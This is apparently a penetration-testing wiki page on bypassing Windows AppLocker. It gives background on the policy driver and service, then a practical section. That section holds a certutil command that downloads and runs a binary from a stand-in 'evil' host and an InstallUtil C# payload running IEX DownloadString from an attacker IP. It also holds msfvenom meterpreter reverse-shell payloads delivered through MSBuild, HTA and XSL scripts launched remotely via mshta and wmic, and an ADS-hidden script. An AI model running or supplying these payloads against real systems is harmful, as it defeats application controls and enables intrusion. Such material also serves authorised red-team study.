# AppLocker Bypass

## Theory

[AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/what-is-applocker) is a security feature introduced in Windows 7 Enterprise and later versions, providing a robust application whitelisting solution to control executable, script, and installer file execution. It aims to replace older [Software Restriction Policies (SRP)](https://learn.microsoft.com/en-us/windows-server/identity/software-restriction-policies/software-restriction-policies) by adding enhanced control and a kernel-level enforcement mechanism.&#x20;

{% hint style="info" %}
Although AppLocker is gradually being replaced by [Windows Defender Application Control (WDAC)](https://learn.microsoft.com/en-us/hololens/windows-defender-application-control-wdac), Formerly known as Device Guard, it remains a popular solution for enterprises due to ease of configuration and deployment.

_WDAC relies on_ [_virtualization-based security (VBS)_](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) _and_ [_HyperVisor Code Integrity (HVCI)_ ](https://learn.microsoft.com/en-us/windows-hardware/drivers/bringup/device-guard-and-credential-guard)_which are only available in Windows 10, Windows 11, and Windows Server 2016 and later_
{% endhint %}

AppLocker consists of two core components:

* **The kernel-mode driver (`APPID.SYS`):**
  * This kernel-level driver provides the foundational enforcement for AppLocker policies by handling process creation blocking through a Process Notification Callback ([PsSetCreateProcessNotifyRoutineEx](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex)). This callback intercepts attempts to execute files and forwards information to AppLocker policies.
  * Additionally, `APPID.SYS` assists in applying broader application control functions, distinguishing it from SRP, which operates entirely in user mode.
* **The user-mode service (`AppIDSvc`):**
  * The `AppIDSvc` service primarily functions as a policy manager, responsible for administrating the whitelist ruleset and performing tasks that are impractical to handle at the kernel level, such as comprehensive code signature verification.
  * The `AppIDSvc` interacts with the `APPID.SYS` driver via Remote Procedure Calls (RPC) to verify digital signatures and validate applications against AppLocker policies.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p><a href="https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html">https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html</a></p></figcaption></figure>

## Practice

This section delves into practical bypass methods, exploring weaknesses in AppLocker’s implementation and configuration. It covers techniques ranging from exploiting policy misconfigurations, abusing trusted applications (living-off-the-land binaries, or LOLBins), manipulating file path rules, and leveraging signature-based bypasses.

### Enumeration

Enumeration is the crucial initial step, providing insight into the specific rules, policies, and whitelisting configurations that AppLocker enforces. By gathering this information, it becomes possible to determine which executables, paths, scripts, and DLLs are allowed or restricted, enabling a strategic approach to potential bypass techniques.

{% tabs %}
{% tab title="PowerShell" %}
The following commands can be used to check whether any AppLocker rules are being enforced.

```powershell
Get-AppLockerPolicy -Effective -Xml
(Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2 -Recurse
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
{% endtab %}
{% endtabs %}

### Writable and Executable Whitelisted Folders

The default rules for AppLocker automatically whitelist all executables and scripts located in the following directories: `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows`.&#x20;

If we discover a folder within these directories that is both **writable and executable**, we can exploit it to **bypass AppLocker policies**.

{% tabs %}
{% tab title="Enumerate" %}
The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803) and may be whitelisted by AppLocker.

```
C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

#### Manual Recon

You can recursively check for writable permissions on the `C:\Windows` folder using Sysinternals' [**AccessChk**](https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk):

```powershell
# w: find writable dir
# u: suppress errors
# s: recursive
accesschk.exe "<USERNAME>" C:\Windows -wus
```

If a folder is writable (e.g., `C:\Windows\Tasks`), you can verify execution permissions using **icacls**:

```powershell
# Example
icacls.exe C:\Windows\Tasks
```

#### Automated Recon

The following PowerShell script automates the process of identifying writable and executable folders:

```powershell
$tools = "C:\SysinternalsSuite"

C:\SysinternalsSuite\accesschk.exe "<USERNAME>" C:\Windows -wus -accepteula | out-file -FilePath C:/users/<USER>/Desktop/permissions.txt

foreach($line in Get-Content  C:/users/<USER>/Desktop/permissions.txt) {
    if($line.StartsWith("RW") -or $line.StartsWith("W"))
    {
    $line.Substring(3) | out-file -FilePath  C:/users/<USER>/Desktop/files.txt -Append
    }
}

foreach($file_path in Get-Content C:/users/<USER>/Desktop/files.txt){
if(Test-Path -Path $file_path -PathType Container)
    {
        cd $tools
        icacls.exe $file_path | out-file -FilePath C:/users/<USER>/Desktop/folder-permissions.txt -Append
    }
}
```
{% endtab %}

{% tab title="Exploit" %}
If we discover a folder that is both writable and executable and has been whitelisted by AppLocker (e.g `C:\Windows\Tasks`), we can exploit it by downloading and executing a malicious binary. Here's how this can be achieved:

```powershell
# Download
certutil.exe -urlcache -split -f http://evil/malware.exe C:\Windows\Tasks\malware.exe

# Execute
C:\Windows\Tasks\malware.exe
```
{% endtab %}
{% endtabs %}

### Alternate Data Stream <a href="#alternate-data-stream" id="alternate-data-stream"></a>

An [**Alternate Data Stream (ADS)** ](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/e2b19412-a925-4360-b009-86e3b8a020c8)is a feature of the NTFS file system that allows files to store additional data streams as metadata. This functionality can be exploited to hide or append binary data (like scripts or executables) to existing files without affecting their primary content. **We can leverage this to bypass AppLocker** or other application control mechanisms by hiding and **executing malicious scripts or binaries in trusted locations**.

{% tabs %}
{% tab title="Enumerate" %}
Like for folders, we may find a file in a trusted location that is both writable and executable as follows:

#### Manual Recon

You can recursively check for writable permissions on the `C:\Windows` folder using Sysinternals' [**AccessChk**](https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk):

```powershell
# w: writable 
# u: suppress errors
# s: recursive
accesschk.exe "<USERNAME>" C:\Windows -wus
```

If a file is writable (e.g. `C:\Program Files (x86)\App\Random_log.log`), you can verify execution permissions using **icacls**:

```powershell
# Example
icacls.exe "C:\Program Files (x86)\App\Random_log.log"
```

#### Automated Recon

The following PowerShell script automates the process of identifying writable and executable files:

```powershell
$tools = "C:\SysinternalsSuite"

C:\SysinternalsSuite\accesschk.exe "<USERNAME>" C:\Windows -wus -accepteula | out-file -FilePath C:/users/<USER>/Desktop/permissions.txt

foreach($line in Get-Content  C:/users/<USER>/Desktop/permissions.txt) {
    if($line.StartsWith("RW") -or $line.StartsWith("W"))
    {
    $line.Substring(3) | out-file -FilePath  C:/users/<USER>/Desktop/files.txt -Append
    }
}

foreach($file_path in Get-Content C:/users/<USER>/Desktop/files.txt){
if(Test-Path -Path $file_path -PathType Container)
    {
        cd $tools
        icacls.exe $file_path | out-file -FilePath C:/users/<USER>/Desktop/folder-permissions.txt -Append
    }
}
```
{% endtab %}

{% tab title="Exploit" %}
If we discover a file that is both writable and executable and has been whitelisted by AppLocker (e.g `C:\Program Files (x86)\App\Random_log.log`), we can exploit it by leveraging Alternate Data Streams (ADS) to append and execute a malicious payload. Here's how this can be done step by step:

Create a malicious javascript file (e.g. `evil.js`)

{% code title="evil.js" %}
```javascript
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("calc.exe");
```
{% endcode %}

Create an alternate data stream to the file

```bash
type evil.js > "C:\Program Files (x86)\App\Random_log.log:evil"
```

Execute the malicious javascript code

```powershell
wscript "C:\Program Files (x86)\App\Random_log.log:evil"
```
{% endtab %}
{% endtabs %}

### Living Off The Land Binaries

{% tabs %}
{% tab title="InstallUtils" %}
The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. We can abuse it to execute arbitrary C# code and bypass AppLocker.

First, compile the following code into Visual Studio.

{% code title="Bypass.cs" %}
```csharp
// code from https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace BypassCLM
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Welcome !");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd = "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKING-IP>/run.txt')";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
{% endcode %}

{% hint style="info" %}
Add a reference for the `System.Management.Automation` assembly before compilation from path:

```
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
```
{% endhint %}

We can then execute code and bypass application whitelisting as follows:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\v4resk\Bypass.exe
```
{% endtab %}

{% tab title="MSBuild" %}
Leveraging [MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/), we can build and execute a C# project stored in the target csproj file.

We can automate this process using [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git), a Python-based tool that leverage MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe.

We may generate a malicious `.csproj` file from a raw shellcode or a powershell script.

```bash
# Malicious .csproj from powershell script
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj

# Malicious .csproj from raw shellcode
v4resk@kali$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f raw > shellcode.raw
v4resk@kali$ python2 PowerLessShell.py -source shellcode.raw -output liv0ff.csproj
```

After writing the `.csproj` file on the target, we can run it as follows

```powershell
#Execute it on the target with MSBuild.exe
C:\Users\victime> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
{% endtab %}

{% tab title="MSHTA" %}
Since `mshta.exe` is located in `C:\Windows\System32` and is a signed Microsoft application, it is often whitelisted by default on AppLocker or WDAC.&#x20;

This trusted status makes `mshta.exe` a prime candidate to execute malicious JScript or VBScript code, bypassing application control restrictions.

{% code title="evil.hta" %}
```html
<html> 
<head> 
<script language="JScript">
<!--- PASTE JSCRIPT PAYLOAD BELOW --->
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
<!--- PASTE JSCRIPT ABOVE--->
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```
{% endcode %}

The above code can be executed from a local or remote location

```powershell
mshta.exe \users\v4resk\evil.hta
mshta.exe http://<ATTACKING_IP>/evil.hta
```
{% endtab %}

{% tab title="WMIC" %}
The WMI command-line (WMIC) utility provides a command-line interface for WMI. It can be leveraged to executes JScript or VBScript embedded in a remote or local XSL stylsheet while bypassing AppLocker.

{% code title="evil.xsl" %}
```markup
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```
{% endcode %}

The above code can be executed from a local or remote location.

```powershell
wmic process get brief /format:"http://192.168.0.1/evil.xsl"
wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\evil.xsl"
```
{% endtab %}

{% tab title="Microsoft.Workflow.Compiler" %}
[Microsoft.Workflow.Compiler.exe](https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/) is an utility included with .NET that is capable of compiling and executing C# or VB.net code. It can be leveraged to compile and execute C# or VB.net code in a XOML file referenced in the .txt file to bypass AppLocker.

{% code title="evil.txt" %}
```csharp
using System;
using System.Diagnostics;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
	    Process process = new Process();
            // Configure the process using the StartInfo properties.
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "powershell.exe -enc <ENCODED PS Payload>";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            process.Start();
            process.WaitForExit();
            Console.WriteLine("I executed!");
    }
}
```
{% endcode %}

Using the above code, saved as a text file, and commande belows, we can create a correctly-serialized XML file, and run our C# code using Microsoft.Workflow.Compiler.exe:

```powershell
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "C:\Users\Rick.Sanchez\evil.txt"
$output = "C:\Users\Rick.Sanchez\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output

$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("YOUR_USER","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe C:\Users\Rick.Sanchez\run.xml C:\Users\Rick.Sanchez\results.xml
```
{% endtab %}
{% endtabs %}

### Bypass Using PowerShell

When AppLocker (or Windows Defender Application Control, WDAC) enforces script whitelisting rules, **ConstrainedLanguage Mode (CLM)** is automatically enabled in PowerShell. This security feature, introduced by Microsoft in PowerShell version 3.0, is designed to restrict the capabilities of PowerShell scripts and reduce the risk of abuse by attackers.

{% content-ref url="powershell-constrained-language-mode-clm-bypass.md" %}
[powershell-constrained-language-mode-clm-bypass.md](powershell-constrained-language-mode-clm-bypass.md)
{% endcontent-ref %}

### Third Party Scripting Interpreter&#x20;

AppLocker enforces rules only against native Windows executable file types, such as `.exe`, `.dll`, `.bat`, `.cmd`, `.vbs`, and `.ps1`. However, if third-party scripting engines like **Python**, **Perl**, or **Ruby** are installed on the system, they can serve as unexpected vectors to bypass application whitelisting with minimal effort.

## Resources

{% embed url="https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html" %}

{% embed url="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass" %}

{% embed url="https://aj-labz.gitbook.io/aj-labz/offensive-cyberz/defense-evasion/evade-heuristic-behaviors/applocker-bypass" %}

{% embed url="https://github.com/api0cradle/UltimateAppLockerByPassList" %}

{% embed url="https://juggernaut-sec.com/applocker-bypass/" %}
